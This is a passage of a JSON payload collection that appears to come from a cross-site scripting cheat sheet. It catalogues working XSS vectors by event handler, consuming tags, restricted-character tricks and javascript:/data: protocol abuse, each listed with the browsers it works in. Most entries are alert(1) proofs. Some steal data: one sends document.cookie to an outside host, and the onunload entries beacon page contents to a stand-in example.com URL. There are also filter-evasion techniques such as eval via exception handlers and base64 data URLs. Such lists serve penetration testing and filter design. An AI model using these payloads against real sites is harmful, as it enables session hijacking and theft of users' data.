                        "interaction": false
                    },
                    {
                        "tag": "audio",
                        "code": "<audio autoplay onplay=alert(1)><source src=\"validaudio.wav\" type=\"audio\/wav\"><\/audio>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onplaying": {
                "description": "Fires the resource is playing",
                "tags": [
                    {
                        "tag": "video",
                        "code": "<video autoplay onplaying=alert(1)><source src=\"validvideo.mp4\" type=\"video\/mp4\"><\/video>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "audio",
                        "code": "<audio autoplay onplaying=alert(1)><source src=\"validaudio.wav\" type=\"audio\/wav\"><\/audio>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onpointerdown": {
                "description": "Fires when the mouse down",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* onpointerdown=alert(1) style=display:block>XSS<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onpointerenter": {
                "description": "Fires when the mouseenter",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* onpointerenter=alert(1) style=display:block>XSS<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onpointerleave": {
                "description": "Fires when the mouseleave",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* onpointerleave=alert(1) style=display:block>XSS<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onpointermove": {
                "description": "Fires when the mouse move",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* onpointermove=alert(1) style=display:block>XSS<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onpointerout": {
                "description": "Fires when the mouse out",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* onpointerout=alert(1) style=display:block>XSS<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onpointerover": {
                "description": "Fires when the mouseover",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* onpointerover=alert(1) style=display:block>XSS<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onpointerrawupdate": {
                "description": "Fires when the pointer changes",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* onpointerrawupdate=alert(1) style=display:block>XSS<\/*>",
                        "browsers": [
                            "chrome"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onpointerup": {
                "description": "Fires when the mouse up",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* onpointerup=alert(1) style=display:block>XSS<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onpopstate": {
                "description": "Fires when the history changes",
                "tags": [
                    {
                        "tag": "body",
                        "code": "<body onpopstate=print()>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onprogress": {
                "description": "Fires when the video\/audio begins downloading",
                "tags": [
                    {
                        "tag": "video",
                        "code": "<video controls onprogress=alert(1)><source src=validvideo.mp4 type=video\/mp4><\/video>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "audio",
                        "code": "<audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio\/mpeg><\/audio>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onratechange": {
                "description": "Fires when the speed of the video changes",
                "tags": [
                    {
                        "tag": "video",
                        "code": "<video controls autoplay onratechange=alert(1)><source src=\"validvideo.mp4\" type=\"video\/mp4\"><\/video>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "audio",
                        "code": "<audio controls autoplay onratechange=alert(1)><source src=\"validaudio.wav\" type=\"audio\/wav\"><\/audio>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onrepeat": {
                "description": "Fires when a svg animation repeats",
                "tags": [
                    {
                        "tag": "animate",
                        "code": "<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 \/>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "animatemotion",
                        "code": "<svg><path><animateMotion onrepeat=alert(1) dur=\"1s\" repeatCount=\"2\">",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "animatetransform",
                        "code": "<svg><animatetransform onrepeat=alert(1) attributeName=transform repeatCount=2 dur=1s>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "set",
                        "code": "<svg><set onrepeat=alert(1) attributename=x dur=1s repeatcount=2>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onreset": {
                "description": "Requires a click",
                "tags": [
                    {
                        "tag": "form",
                        "code": "<form onreset=alert(1)><input type=reset>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onresize": {
                "description": "Fires when the window is resized",
                "tags": [
                    {
                        "tag": "body",
                        "code": "<body onresize=\"print()\">",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onscroll": {
                "description": "Fires when the page scrolls",
                "tags": [
                    {
                        "tag": "body",
                        "code": "<body onscroll=alert(1)><div style=height:1000px><\/div><div id=x><\/div>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    }
                ]
            },
            "onscrollend": {
                "description": "Fires when the scrolling to the end of the element",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* onscrollend=alert(1) style=\"display:block;overflow:auto;border:1px dashed;width:500px;height:100px;\"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test<\/span><\/*>",
                        "browsers": [
                            "chrome",
                            "firefox"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    }
                ]
            },
            "onsearch": {
                "description": "Fires when a form is submitted and the input has a type attribute of search",
                "tags": [
                    {
                        "tag": "input",
                        "code": "<form><input type=search onsearch=alert(1) value=\"Hit return\" autofocus>",
                        "browsers": [
                            "chrome"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onseeked": {
                "description": "Requires clicking the element timeline",
                "tags": [
                    {
                        "tag": "audio",
                        "description": "",
                        "code": "<audio autoplay controls onseeked=alert(1)><source src=\"validaudio.wav\" type=\"audio\/wav\"><\/audio>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "video",
                        "code": "<video autoplay controls onseeked=alert(1)><source src=\"validvideo.mp4\" type=\"video\/mp4\"><\/video>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onseeking": {
                "description": "Requires clicking the element timeline",
                "tags": [
                    {
                        "tag": "video",
                        "code": "<video autoplay controls onseeking=alert(1)><source src=\"validvideo.mp4\" type=\"video\/mp4\"><\/video>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "audio",
                        "code": "<audio autoplay controls onseeking=alert(1)><source src=\"validaudio.wav\" type=\"audio\/wav\"><\/audio>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onselect": {
                "description": "Requires you select text",
                "tags": [
                    {
                        "tag": "input",
                        "code": "<input onselect=alert(1) value=\"XSS\" autofocus>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "textarea",
                        "code": "<textarea onselect=alert(1) autofocus>XSS<\/textarea>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onselectionchange": {
                "description": "Fires when text selection is changed on the page",
                "tags": [
                    {
                        "tag": "body",
                        "code": "<body onselectionchange=alert(1)>select some text",
                        "browsers": [
                            "chrome",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onselectstart": {
                "description": "Fires when beginning a text selection",
                "tags": [
                    {
                        "tag": "body",
                        "code": "<body onselectstart=alert(1)>select some text",
                        "browsers": [
                            "chrome",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onshow": {
                "description": "Fires context menu is shown",
                "tags": [
                    {
                        "tag": "menu",
                        "code": "<div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)><\/menu><\/div>",
                        "browsers": [
                            "firefox"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onstart": {
                "description": "Fires when the marquee starts",
                "tags": [
                    {
                        "tag": "marquee",
                        "code": "<marquee onstart=alert(1)>XSS<\/marquee>",
                        "browsers": [
                            "firefox"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onsubmit": {
                "description": "Requires a form submission",
                "tags": [
                    {
                        "tag": "form",
                        "code": "<form onsubmit=alert(1)><input type=submit>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onsuspend": {
                "description": "Fires when the video\/audio when the data loading is suspended",
                "tags": [
                    {
                        "tag": "video",
                        "code": "<video controls onsuspend=alert(1)><source src=validvideo.mp4 type=video\/mp4><\/video>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "audio",
                        "code": "<audio controls onsuspend=alert(1)><source src=validaudio.mp3 type=audio\/mpeg><\/audio>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "ontimeupdate": {
                "description": "Fires when the timeline is changed",
                "tags": [
                    {
                        "tag": "video",
                        "code": "<video controls autoplay ontimeupdate=alert(1)><source src=\"validvideo.mp4\" type=\"video\/mp4\"><\/video>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "audio",
                        "code": "<audio controls autoplay ontimeupdate=alert(1)><source src=\"validaudio.wav\" type=\"audio\/wav\"><\/audio>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "ontoggle": {
                "description": "Fires when the details tag is expanded",
                "tags": [
                    {
                        "tag": "details",
                        "code": "<details ontoggle=alert(1) open>test<\/details>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "ontoggle(popover)": {
                "description": "Fires when the a popop element is toggled",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<button popovertarget=x>Click me<\/button><* ontoggle=alert(1) popover id=x>XSS<\/*>",
                        "browsers": [
                            "chrome"
                        ],
                        "interaction": true
                    }
                ]
            },
            "ontouchend": {
                "description": "Fires when the touch screen, only mobile device",
                "tags": [
                    {
                        "tag": "body",
                        "code": "<body ontouchend=alert(1)> ",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "ontouchmove": {
                "description": "Fires when the touch screen and move, only mobile device",
                "tags": [
                    {
                        "tag": "body",
                        "code": "<body ontouchmove=alert(1)> ",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "ontouchstart": {
                "description": "Fires when the touch screen, only mobile device",
                "tags": [
                    {
                        "tag": "body",
                        "code": "<body ontouchstart=alert(1)> ",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "ontransitioncancel": {
                "description": "Fires when a CSS transition cancels",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<style>:target {color: red;}<\/style><* id=x style=\"transition:color 10s\" ontransitioncancel=print()><\/*>",
                        "browsers": [
                            "firefox"
                        ],
                        "interaction": false
                    }
                ]
            },
            "ontransitionend": {
                "description": "Fires when a CSS transition ends",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* id=x style=\"transition:outline 1s\" ontransitionend=alert(1) tabindex=1><\/*>",
                        "browsers": [
                            "chrome"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    }
                ]
            },
            "ontransitionrun": {
                "description": "Fires when a CSS transition begins",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<style>:target {transform: rotate(180deg);}<\/style><* id=x style=\"transition:transform 2s\" ontransitionrun=print()><\/*>",
                        "browsers": [
                            "firefox"
                        ],
                        "interaction": false
                    }
                ]
            },
            "ontransitionstart": {
                "description": "Fires when a CSS transition starts",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<style>:target {color:red;}<\/style><* id=x style=\"transition:color 1s\" ontransitionstart=alert(1)><\/*>",
                        "browsers": [
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    }
                ]
            },
            "onunhandledrejection": {
                "description": "Fires when a promise isn't handled",
                "tags": [
                    {
                        "tag": "body",
                        "code": "<body onunhandledrejection=alert(1)><script>fetch('\/\/xyz')<\/script>",
                        "browsers": [
                            "firefox"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onunload": {
                "description": "Fires when the page is unloaded",
                "tags": [
                    {
                        "tag": "svg",
                        "code": "<svg onunload=navigator.sendBeacon('\/\/https:\/\/ssl.example.com\/', document.body.innerHTML)>",
                        "browsers": [
                            "chrome"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "body",
                        "code": "<body onunload=navigator.sendBeacon('\/\/https:\/\/ssl.example.com\/', document.body.innerHTML)>",
                        "browsers": [
                            "chrome",
                            "firefox"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onvolumechange": {
                "description": "Requires volume adjustment",
                "tags": [
                    {
                        "tag": "video",
                        "code": "<video autoplay controls onvolumechange=alert(1)><source src=\"validvideo.mp4\" type=\"video\/mp4\"><\/video>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "audio",
                        "code": "<audio autoplay controls onvolumechange=alert(1)><source src=\"validaudio.wav\" type=\"audio\/wav\"><\/audio>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onwebkitanimationend": {
                "description": "Fires when a CSS animation ends",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<style>@keyframes x{}<\/style><* style=\"animation-name:x\" onwebkitanimationend=\"alert(1)\"><\/*>",
                        "browsers": [
                            "chrome",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onwebkitanimationiteration": {
                "description": "Fires when a CSS animation repeats",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<style>@keyframes slidein {}<\/style><* style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onwebkitanimationiteration=\"alert(1)\"><\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onwebkitanimationstart": {
                "description": "Fires when a CSS animation starts",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<style>@keyframes x{}<\/style><* style=\"animation-name:x\" onwebkitanimationstart=\"alert(1)\"><\/*>",
                        "browsers": [
                            "chrome",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onwebkittransitionend": {
                "description": "Fires when a CSS transition ends",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<style>:target {color:red;}<\/style><* id=x style=\"transition:color 1s\" onwebkittransitionend=alert(1)><\/*>",
                        "browsers": [
                            "chrome"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    }
                ]
            },
            "onwheel": {
                "description": "Fires when you use the mouse wheel",
                "tags": [
                    {
                        "tag": "body",
                        "code": "<body onwheel=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            }
        }
    },
    {
        "name": "Consuming tags",
        "id": "consuming",
        "data": [
            {
                "name": "Noembed consuming tag",
                "value": "<noembed><img title=\"</noembed><img src onerror=alert(1)>\"></noembed>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Noscript consuming tag",
                "value": "<noscript><img title=\"</noscript><img src onerror=alert(1)>\"></noscript>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Style consuming tag",
                "value": "<style><img title=\"</style><img src onerror=alert(1)>\"></style>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Script consuming tag",
                "value": "<script><img title=\"</script><img src onerror=alert(1)>\"></script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "iframe consuming tag",
                "value": "<iframe><img title=\"</iframe><img src onerror=alert(1)>\"></iframe>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "xmp consuming tag",
                "value": "<xmp><img title=\"</xmp><img src onerror=alert(1)>\"></xmp>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "textarea consuming tag",
                "value": "<textarea><img title=\"</textarea><img src onerror=alert(1)>\"></textarea>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "noframes consuming tag",
                "value": "<noframes><img title=\"</noframes><img src onerror=alert(1)>\"></noframes>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Title consuming tag",
                "value": "<title><img title=\"</title><img src onerror=alert(1)>\"></title>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            }
        ]
    },
    {
        "name": "Restricted characters",
        "id": "restricted",
        "data": [
            {
                "name": "No parentheses using exception handling",
                "value": "<script>onerror=alert;throw 1</script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "No parentheses using exception handling no semi colons",
                "value": "<script>{onerror=alert}throw 1</script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "No parentheses using exception handling no semi colons using expressions",
                "value": "<script>throw onerror=alert,1</script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "No parentheses using exception handling and string eval on Chrome / Edge",
                "value": "<script>throw onerror=eval,'=alert\\x281\\x29'</script>",
                "browsers": [
                    "chrome"
                ]
            },
            {
                "name": "No parentheses using exception handling and string eval on Safari",
                "value": "<script>throw onerror=eval,'alert\\x281\\x29'</script>",
                "browsers": [
                    "safari"
                ]
            },
            {
                "name": "No parentheses using exception handling and object eval on Firefox",
                "value": "<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\\x281\\x29'}</script>",
                "browsers": [
                    "firefox"
                ]
            },
            {
                "name": "No parentheses using exception handling and object eval on Firefox / Safari",
                "value": "<script>throw onerror=eval,e=new Error,e.message='alert\\x281\\x29',e</script>",
                "browsers": [
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "No parentheses using exception handling and location hash eval on all browsers",
                "value": "<script>throw onerror=Uncaught=eval,e=new Error,e.message='/*'+location.hash,!!window.InstallTrigger?e:e.message</script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "No parentheses, no quotes, no spaces using exception handling and location hash eval on all browsers",
                "value": "<script>throw{},onerror=Uncaught=eval,h=location.hash,e={lineNumber:1,columnNumber:1,fileName:0,message:h[2]+h[1]+h},!!window.InstallTrigger?e:e.message</script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "No parentheses, no quotes, no spaces, no curly brackets using exception handling and location hash eval on all browsers",
                "value": "<script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message</script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "No parentheses using ES6 hasInstance and instanceof with eval",
                "value": "<script>'alert\\x281\\x29'instanceof{[Symbol.hasInstance]:eval}</script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "No parentheses using ES6 hasInstance and instanceof with eval without .",
                "value": "<script>'alert\\x281\\x29'instanceof{[Symbol['hasInstance']]:eval}</script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "No parentheses using location redirect",
                "value": "<script>location='javascript:alert\\x281\\x29'</script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "No parentheses using location redirect no strings",
                "value": "<script>location=name</script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "No parentheses using template strings",
                "value": "<script>alert`1`</script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "No parentheses using template strings and location hash",
                "value": "<script>new Function`X${document.location.hash.substr`1`}`</script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "No parentheses or spaces, using template strings and location hash",
                "value": "<script>Function`X${document.location.hash.substr`1`}```</script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS cookie exfiltration without parentheses, backticks or quotes",
                "value": "<video><source onerror=location=/\\02.rs/+document.cookie>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS without greater than",
                "value": "<svg onload=alert(1)",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS without greater using a HTML comment",
                "value": "<svg onload=alert(1)<!--",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Array based destructuring using onerror",
                "value": "<script>throw[onerror]=[alert],1</script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Destructuring using onerror",
                "value": "<script>var{a:onerror}={a:alert};throw 1</script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Destructuring using default values and onerror",
                "value": "<script>var{haha:onerror=alert}=0;throw 1</script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Vector using window.name",
                "value": "<script>window.name='javascript:alert(1)';</script><svg onload=location=name>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Avoiding Invalid left-hand side in assignment without `, (), ?, [], or , using object literal",
                "value": "<script>window.name='javascript:alert(1)';function blah(){} blah(\"\"+{a:location=name}+\"\")</script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Avoiding Invalid left-hand side in assignment without `, (), ?, [], or , using new class",
                "value": "<script>window.name='javascript:alert(1)';function blah(){} blah(\"\"+new class b{toString=e=>location=name}+\"\")</script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            }
        ]
    },
    {
        "name": "Protocols",
        "id": "protocols",
        "data": [
            {
                "name": "Iframe src attribute JavaScript protocol",
                "value": "<iframe src=\"javascript:alert(1)\">",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Object data attribute with JavaScript protocol",
                "value": "<object data=\"javascript:alert(1)\">",
                "browsers": [
                    "firefox"
                ]
            },
            {
                "name": "Embed src attribute with JavaScript protocol",
                "value": "<embed src=\"javascript:alert(1)\">",
                "browsers": [
                    "firefox"
                ]
            },
            {
                "name": "A standard JavaScript protocol",
                "value": "<a href=\"javascript:alert(1)\">XSS</a>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "The protocol is not case sensitive",
                "value": "<a href=\"JaVaScript:alert(1)\">XSS</a>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Characters \\x01-\\x20 are allowed before the protocol",
                "value": "<a href=\" javascript:alert(1)\">XSS</a>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Characters \\x09,\\x0a,\\x0d are allowed inside the protocol",
                "value": "<a href=\"javas cript:alert(1)\">XSS</a>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Characters \\x09,\\x0a,\\x0d are allowed after protocol name before the colon",
                "value": "<a href=\"javascript :alert(1)\">XSS</a>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Xlink namespace inside SVG with JavaScript protocol",
                "value": "<svg><a xlink:href=\"javascript:alert(1)\"><text x=\"20\" y=\"20\">XSS</text></a>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "SVG animate tag using values",
                "value": "<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "SVG animate tag using to",
                "value": "<svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "SVG set tag",
                "value": "<svg><set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Data protocol inside script src",
                "value": "<script src=\"data:text/javascript,alert(1)\"></script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "SVG script href attribute without closing script tag",
                "value": "<svg><script href=\"data:text/javascript,alert(1)\" />",
                "browsers": [
                    "firefox"
                ]
            },
            {
                "name": "SVG use element Chrome/Firefox",
                "value": "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x\"></use></svg>",
                "browsers": [
                    "chrome",
                    "firefox"
                ]
            },
            {
                "name": "Import statement with data URL",
                "value": "<script>import('data:text/javascript,alert(1)')</script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Base tag with JavaScript protocol rewriting relative URLS",
                "value": "<base href=\"javascript:/a/-alert(1)///////\"><a href=../lol/safari.html>test</a>",
                "browsers": [
                    "safari"
                ]
            },
            {
                "name": "MathML makes any tag clickable",
                "value": "<math><x href=\"javascript:alert(1)\">blah",
                "browsers": [
                    "firefox"
                ]
            },
            {
                "name": "Button and formaction",
                "value": "<form><button formaction=javascript:alert(1)>XSS",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Input and formaction",
                "value": "<form><input type=submit formaction=javascript:alert(1) value=XSS>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Form and action",
                "value": "<form action=javascript:alert(1)><input type=submit value=XSS>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Animate tag with keytimes and multiple values",
                "value": "<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values=\"https://example.com?&semi;javascript:alert(1)&semi;0\" /><a id=xss><text x=20 y=20>XSS</text></a>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "JavaScript protocol with new line",
                "value": "<a href=\"javascript://%0aalert(1)\">XSS</a>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Data URL with use element and base64 encoded",
                "value": "<svg><use href=\"data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x\" /></svg>",
                "browsers": [
                    "chrome",
                    "firefox"
                ]
            },
            {
                "name": "Data URL with use element",
                "value": "<svg><use href=\"data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x\" />",
                "browsers": [
                    "chrome",
                    "firefox"
                ]
            },
            {
                "name": "Animate tag with auto executing use element",
